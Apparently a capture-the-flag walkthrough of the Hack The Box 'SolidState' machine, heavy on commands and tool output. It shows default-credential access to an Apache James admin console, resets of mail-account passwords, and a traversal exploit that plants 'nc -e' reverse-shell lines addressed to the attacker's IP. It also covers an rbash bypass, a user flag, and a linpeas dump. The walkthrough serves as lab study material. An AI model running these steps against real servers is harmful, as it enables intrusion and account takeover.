#James-Mail-Server #rbash

# Reconnaissance

```bash
# Automatic tools
# nmapAutomator (https://github.com/21y4d/nmapAutomator)
cd /usr/local/bin/
sudo ./nmapAutomator.sh --host 10.10.10.51 --type All
# Nmap
nmap -sV -sC -A 10.10.10.51 -Pn
```

```txt
                                                        
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.3 [10.10.14.3])
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp open  pop3    JAMES pop3d 2.3.2
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
119/tcp open  nntp    JAMES nntpd (posting ok)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel


---------------------Starting Full Scan------------------------
                                                                    
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Making a script scan on extra ports: 4555
                                                                                                                            
PORT     STATE SERVICE VERSION
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:

```

# Enumeration

## Enumerate on 80

![[SolidState-01.png]]

we check the 80 port of this site and found a website named solid state security.
And in the bottom of this page, we will find contact email address info which maybe useful in the future.

```
webadmin@solid-state-security.com
```

we try use gobuster to find any information.

```bash
gobuster dir -u http://10.10.10.51/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k -t 20 -s 200 -x php,txt,jpg,jpeg,gif
```

```txt
/images               (Status: 301) [Size: 311] [--> http://10.10.10.51/images/]
/assets               (Status: 301) [Size: 311] [--> http://10.10.10.51/assets/]

```

we will find there is directory access, but nothing was useful or interesting.

![[SolidState-02.png]]

## Enumerate on 25/110/119

we will find SMTP and POP service on that , seems like it was a email service.

```
JAMES smtpd 2.3.2
JAMES pop3d 2.3.2
```
## Enumerate on 4555

when we review the 4555 port, we will find a 'JAMES Remote Administration Tool 2.3.2' page like this:

![[SolidState-03.png]]

# Exploitation

## Exploit James Remote Administration Tool

We recall that we have a port open on 4555.

let's nc this port. Very nice, it was JAMES remote Admin tool. We try use root:root to login.

```bash
# connect the 4555 port
nc 10.10.10.51 4555
# input the credential
root
root
# check the commands we could use
HELP
listusers
# and we find we have mutiple users, we try change one account 
setpassword john john
```

![[SolidState-06.png]]

![[SolidState-08.png]]

OK, so now we have the users for the POP3 service and their passwords. Now, let’s dig into that, for that we will use telnet.

```bash
telnet 10.10.10.51 110
User john
Pass john
LIST
retr 1
```

we will find a email sends to john that told Mindy has been sent a tempory password to login accounts.

```txt
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.

```

very nice ,we try to reset password for Mindy.

```bash
# connect the 4555 port
nc 10.10.10.51 4555
# input the credential
root
root
# and we find we have mutiple users, we try change one account 
setpassword mindy mindy
```

![[SolidState-09.png]]

and use mindy to login pop port to get some email:

```bash
telnet 10.10.10.51 110
User mindy
Pass mindy
LIST
retr 1
retr 2
```

```txt
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.

```

Excellent! we will know the ssh credentials of mindy, and the password was 'P@55W0rd1!2@'

## Bypass rbash
So we could use searchsploit to search any information of this tool.

```bash
searchsploit JAMES 2.3.2
```

![[SolidState-04.png]]

And we try James Server 2.3.2 remote command execution exploit. And we google this exploit details.

https://chowdera.com/2021/12/202112291342091409.html

When exploiting this vulnerability , It is important to note that payload Add... After the command in `&`, Make the command execute in the background , 

we observe 'reverse shell cheat sheet' add this contents as command:

```bash
searchsploit -x 35513
searchsploit -m 35513
```

```bash
# add the payload content
nc -e /bin/sh 10.10.14.3 1234
```
![[SolidState-07.png]]

When a user is created in James, a folder is created for that user based on their username, and when email comes in, it is stored in that folder. The issue is that no bounds checking is done on that user name, so if the user is named `../../../../../../../0xdf`, then it will create that folder at the root level and drop files in it with the contents of received emails.

The question then becomes, how can I use this semi-arbitrary root write access to my advantage? I can control the folder that’s written into, but not fully the filename. This eliminates ideas like writing a public key into `/root/.ssh/authorized_keys` or changing the `/etc/sudoers` or `/etc/passwd` files.

The solution the script authors came up with is a good one. Bash completion scripts provide custom tab completion for various commands. For example, when I type `git stat[tab]`, it auto completes `git status` based on a git bash completion script that runs each time a session starts on my host. In fact, a few weeks ago I was looking at writing custom bash completion scripts, and it’s not hard. I tweeted a really nice overwview post.

Anyway, by writing to `/etc/bash_completion.d`, when any user logs in, that user will run each file in there as a `bash` script.

![[SolidState-14.png]]

```bash
# build up a lhost listener
nc -vlp 1234
# exectute the script
python 35513.py 10.10.10.51
```

![[SolidState-05.png]]

Done! Payload will be executed once somebody logs in.

## Another method to bypass (optional)

```bash
root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555  
JAMES Remote Administration Tool 2.3.2  
Please enter your login and password  
Login id:  
root  
Password:  
root  
Welcome root. HELP for a list of commands  
adduser ../../../../../../../../etc/bash_completion.d password  
User ../../../../../../../../etc/bash_completion.d added
```

```bash
root@kali:~# telnet 10.10.10.51 25  
Trying 10.10.10.51...  
Connected to 10.10.10.51.  
Escape character is '^]'.  
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST)  
EHLO bla.bla  
250-solidstate Hello bla.bla (10.10.14.12 [10.10.14.12])  
250-PIPELINING  
250 ENHANCEDSTATUSCODES  
MAIL FROM: <'[random@random.com](mailto:random@random.com)>  
250 2.1.0 Sender <'[random@random.com](mailto:random@random.com)> OK  
RCPT TO: <../../../../../../../../etc/bash_completion.d>  
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK  
DATA  
354 Ok Send data ending with <CRLF>.<CRLF>  
FROM: bla.bla  
'  
/bin/nc -e /bin/bash 10.10.14.12 1234  
.  
250 2.6.0 Message received  
quit  
221 2.0.0 solidstate Service closing transmission channel  
Connection closed by foreign host.
```

### Quick Method
```bash
# use -t bash to bypass rbash constrain
sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash
```
## SSH Login to load script
let's ssh mindy account to activate the shell, to bypass the restricted shell (on restricted shell, we can't use whoami etc command)

```bash
ssh mindy@10.10.10.51
P@55W0rd1!2@
```

![[SolidState-10.png]]

```bash
# CTRL + C
whoami
id
# upgrade the shell
python -c 'import pty;pty.spawn("/bin/bash")'
# type the user flag
cd mindy
ls
cat user.txt
# flag
41f48a048598c93de504d50ece6edb72
```

![[SolidState-20.png]]

# Privielge Escalation

Now let’s move towards the 2nd challenge for root.txt and currently we are in Mindy directory.

```bash
pwd
```

![[SolidState-13.png]]

Let’s transfer the LinEnum script https://github.com/rebootuser/LinEnum from our attack machine to the target machine.
In the attack machine, start up a server in the same directory that the script resides in.

## linpeas.sh

```bash
# download LinEnum
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# lhost
python -m SimpleHTTPServer 80
# rhost
cd /tmp  
wget http://10.10.14.3/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### output of linpeas
```txt
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ chmod +x linpeas.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                                                                                               
    |---------------------------------------------------------------------------|                                                                                               
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                                                                                               
    |         Follow on Twitter   :     @carlospolopm                           |                                                                                               
    |         Respect on HTB      :     SirBroccoli                             |                                                                                               
    |---------------------------------------------------------------------------|                                                                                               
    |                                 Thank you!                                |                                                                                               
    \---------------------------------------------------------------------------/                                                                                               
          linpeas-ng by carlospolop                                                                                                                                             
                                                                                                                                                                                
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                      
                                                                                                                                                                                
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                        
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                                                         
                                         ╚═══════════════════╝                                                                                                                  
OS: Linux version 4.9.0-3-686-pae (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18) ) #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06)
User & Groups: uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
Hostname: solidstate
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                   
                                                                                                                                                                                

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE
                                                                                                                                                                                
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                                                          
                                        ╚════════════════════╝                                                                                                                  
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                              
Linux version 4.9.0-3-686-pae (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18) ) #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06)                       
Distributor ID: Debian
Description:    Debian GNU/Linux 9.0 (stretch)
Release:        9.0
Codename:       stretch

╔══════════╣ Sudo version
sudo Not Found                                                                                                                                                                  
                                                                                                                                                                                
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                     

./linpeas.sh: 1197: ./linpeas.sh: [[: not found
./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
./linpeas.sh: 1197: ./linpeas.sh: 0: not found
./linpeas.sh: 1207: ./linpeas.sh: [[: not found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                         
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                                                                                                                        
New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin

╔══════════╣ Date & uptime
Tue Jul 26 05:53:03 EDT 2022                                                                                                                                                    
 05:53:03 up 1 day,  2:19,  1 user,  load average: 0.22, 0.05, 0.02

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                            
sda
sda1
sda2

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices                                                                                                                                      
UUID=a28a8ba2-4b0a-4d2e-a369-12c85145f384 /               ext4    errors=remount-ro 0       1                                                                                   
/dev/sda2 none            swap    sw              0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                         
HISTFILESIZE=0                                                                                                                                                                  
MAIL=/var/mail/mindy
USER=mindy
SSH_CLIENT=10.10.14.3 55232 22
SHLVL=2
HOME=/home/mindy
OLDPWD=/home/mindy
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
LOGNAME=mindy
_=./linpeas.sh
XDG_SESSION_ID=493
TERM=xterm-256color
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/rbash
PWD=/tmp
SSH_CONNECTION=10.10.14.3 55232 10.10.10.51 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                          
dmesg Not Found                                                                                                                                                                 
                                                                                                                                                                                
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                              
cat: write error: Broken pipe                                                                                                                                                   
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                         
                                                                                                                                                                                
╔══════════╣ Protections
═╣ AppArmor enabled? .............. /etc/apparmor.d                                                                                                                             
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                               
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                        
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                          
═╣ Is ASLR enabled? ............... Yes                                                                                                                                         
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                                                

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════                                                                         
                                             ╚═══════════╝                                                                                                                      
╔══════════╣ Container related tools present
╔══════════╣ Container details                                                                                                                                                  
═╣ Is this a container? ........... No                                                                                                                                          
═╣ Any running containers? ........ No                                                                                                                                          
                                                                                                                                                                                

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════                                                                          
                          ╚════════════════════════════════════════════════╝                                                                                                    
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                     
root         1  0.0  0.3  26988  6280 ?        Ss   Jul25   0:03 /sbin/init                                                                                                     
root       318  0.0  0.4  54532 10200 ?        Ssl  Jul25   1:17 /usr/bin/vmtoolsd
root       326  0.0  0.3  28688  6740 ?        Ss   Jul25   0:01 /lib/systemd/systemd-journald
root       367  0.0  0.1  16052  4064 ?        Ss   Jul25   0:00 /lib/systemd/systemd-udevd
systemd+   398  0.0  0.2  16964  4272 ?        Ssl  Jul25   0:04 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
avahi      523  0.0  0.0   6256   296 ?        S    Jul25   0:00  _ avahi-daemon: chroot helper
root       506  0.0  0.0   2332   588 ?        Ss   Jul25   0:00 /bin/sh /opt/james-2.3.2/bin/run.sh
root       528  0.1  5.3 850804 110712 ?       Sl   Jul25   2:02  _ /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar
root       508  0.0  0.4  51908  8436 ?        Ssl  Jul25   0:00 /usr/sbin/ModemManager
root       509  0.0  0.2   7448  4732 ?        Ss   Jul25   0:00 /lib/systemd/systemd-logind
rtkit      510  0.0  0.1  24100  3160 ?        SNsl Jul25   0:00 /usr/lib/rtkit/rtkit-daemon
  └─(Caps) 0x0000000000800004=cap_dac_read_search,cap_sys_nice
root       513  0.0  0.1   5264  2840 ?        Ss   Jul25   0:00 /usr/sbin/cron -f
root       516  0.0  0.7  53964 16224 ?        Ss   Jul25   0:00 /usr/bin/VGAuthService
message+   518  0.0  0.2   6840  4540 ?        Ss   Jul25   0:04 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root       529  0.0  0.7  93768 15128 ?        Ssl  Jul25   0:14 /usr/sbin/NetworkManager --no-daemon[0m
root       530  0.0  0.1  23868  3376 ?        Ssl  Jul25   0:00 /usr/sbin/rsyslogd -n
root       531  0.0  0.3  41404  7684 ?        Ssl  Jul25   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       562  0.0  0.4  42076  9700 ?        Ssl  Jul25   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       717  0.0  0.2  10472  5720 ?        Ss   Jul25   0:00 /usr/sbin/sshd -D
mindy    29283  0.0  0.1  11156  3840 ?        S    02:24   0:00      _ sshd: mindy@pts/0
mindy    29284  0.0  0.2   6892  4520 pts/0    Ss   02:24   0:00          _ -rbash
mindy    29324  0.0  0.3  10140  6256 pts/0    S+   02:25   0:00              _ python -c import pty;pty.spawn("/bin/bash")
mindy    29325  0.0  0.1   5660  3576 pts/1    Ss   02:25   0:00                  _ /bin/bash
mindy     1762  0.9  0.1   3172  2376 pts/1    S+   05:52   0:00                      _ /bin/sh ./linpeas.sh
mindy     4352  0.0  0.0   3172   916 pts/1    S+   05:53   0:00                          _ /bin/sh ./linpeas.sh
mindy     4355  0.0  0.1   7820  3392 pts/1    R+   05:53   0:00                          |   _ ps fauxwww
mindy     4356  0.0  0.0   3172   916 pts/1    S+   05:53   0:00                          _ /bin/sh ./linpeas.sh
root       727  0.0  0.0   2104    60 ?        Ss   Jul25   0:01 /usr/sbin/minissdpd -i 0.0.0.0
root       732  0.0  0.3  41228  6972 ?        Ssl  Jul25   0:00 /usr/sbin/gdm3
Debian-+   766  0.0  0.2  27632  4380 tty1     Ssl+ Jul25   0:00      _ /usr/lib/gdm3/gdm-wayland-session gnome-session --autostart /usr/share/gdm/greeter/autostart
Debian-+   770  0.0  0.6  77820 12532 tty1     Sl+  Jul25   0:00          _ /usr/lib/gnome-session/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
Debian-+   780  0.0  6.2 843136 128364 tty1    Sl+  Jul25   0:43              _ /usr/bin/gnome-shell
Debian-+   847  0.0  1.3  98320 28828 tty1     Sl+  Jul25   0:00              |   _ /usr/bin/Xwayland :1024 -rootless -noreset -listen 4 -listen 5 -displayfd 6
Debian-+   912  0.0  2.1 449008 45028 tty1     Sl+  Jul25   0:02              _ /usr/lib/gnome-settings-daemon/gnome-settings-daemon
Debian-+   761  0.0  0.2   9488  6168 ?        Ss   Jul25   0:00 /lib/systemd/systemd --user
Debian-+   762  0.0  0.0  10628  1184 ?        S    Jul25   0:00  _ (sd-pam)
Debian-+   768  0.0  0.1   6368  3772 ?        Ss   Jul25   0:00  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation
Debian-+   878  0.0  0.3  48048  7252 ?        Ssl  Jul25   0:00  _ /usr/lib/at-spi2-core/at-spi-bus-launcher
Debian-+   887  0.0  0.1   6260  3448 ?        S    Jul25   0:00  |   _ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
Debian-+   889  0.0  0.3  30484  6284 ?        Sl   Jul25   0:00  _ /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
Debian-+   895  0.0  0.4 888536  9876 ?        Ssl  Jul25   0:00  _ /usr/bin/pulseaudio --daemonize=no
root       786  0.0  0.3  51336  7936 ?        Ssl  Jul25   0:00 /usr/lib/upower/upowerd
root       911  0.0  0.2  10772  4824 ?        Ss   Jul25   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       915  0.0  0.5  48048 11940 ?        Ssl  Jul25   0:00 /usr/lib/packagekit/packagekitd
colord     929  0.0  0.7  48724 15216 ?        Ssl  Jul25   0:00 /usr/lib/colord/colord
root       953  0.0  0.2   6408  4416 ?        Ss   Jul25   0:03 /usr/sbin/apache2 -k start
www-data   982  0.0  0.2 231292  4884 ?        Sl   Jul25   0:26  _ /usr/sbin/apache2 -k start
www-data   983  0.0  0.2 230012  4628 ?        Sl   Jul25   0:26  _ /usr/sbin/apache2 -k start
root     26433  0.0  0.3  14652  7172 ?        Ss   00:05   0:00 /usr/sbin/cupsd -l
root     26435  0.0  0.4  35424  8712 ?        Ssl  00:05   0:00 /usr/sbin/cups-browsed
mindy    29274  0.0  0.2   9492  6024 ?        Ss   02:24   0:00 /lib/systemd/systemd --user
mindy    29275  0.0  0.0  28044  1252 ?        S    02:24   0:00  _ (sd-pam)
systemd+  1118  0.0  0.1   7480  4012 ?        Ss   05:35   0:00 /lib/systemd/systemd-resolved

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                    
                                                                                                                                                                                
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                              
COMMAND     PID   TID             USER   FD      TYPE     DEVICE SIZE/OFF       NODE NAME                                                                                       

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                              
gdm-password Not Found                                                                                                                                                          
gnome-keyring-daemon Not Found                                                                                                                                                  
lightdm Not Found                                                                                                                                                               
vsftpd Not Found                                                                                                                                                                
apache2 process found (dump creds from memory as root)                                                                                                                          
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                          
/usr/bin/crontab                                                                                                                                                                
incrontab Not Found
-rw-r--r-- 1 root root     722 May  3  2015 /etc/crontab                                                                                                                        

/etc/cron.d:
total 24
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27 11:06 ..
-rw-r--r--   1 root root   285 May 29  2017 anacron
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.daily:
total 56
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27 11:06 ..
-rwxr-xr-x   1 root root   311 May 29  2017 0anacron
-rwxr-xr-x   1 root root   539 Jul 18  2017 apache2
